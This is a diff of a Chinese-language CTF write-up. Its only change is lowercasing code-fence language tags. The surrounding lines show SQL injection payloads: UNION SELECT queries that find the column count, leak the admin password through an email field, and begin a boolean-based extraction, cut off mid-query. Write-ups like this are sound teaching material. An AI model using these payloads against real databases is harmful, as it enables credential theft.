@@ -72,7 +72,7 @@ draft: false
 先試試看有哪些欄位，`' UNION SELECT NULL, NULL, NULL, NULL -- ` 發現會顯示 email 格式錯誤，表示這個表格一共有四個欄位，並且嘗試 `' UNION SELECT '', '', '', 'test@email.com' -- ` 後發現第四個欄位是 email。  
 由於前面送出後顯示的是 email，那有沒有可能利用 UNION 在前端顯示出 admin 的密碼呢？
 
-```SQL
+```sql
 ' UNION SELECT '', '', '', (SELECT printf('%s@x.com', password) FROM users LIMIT 1) --
 ```
 
@@ -83,7 +83,7 @@ draft: false
 ~~有點想把 email 改成自己的真實 email~~，但一想到後台會看到甚麼就覺得還是算了 w  
 試試看 password 是不是就是 flag，如果是，那顯示的 email 開頭會是 t ，反之，email 開頭會顯示 f
 
-```SQL
+```sql
 ' UNION SELECT '', '', '', (
   CASE WHEN EXISTS(
     SELECT 1 FROM users
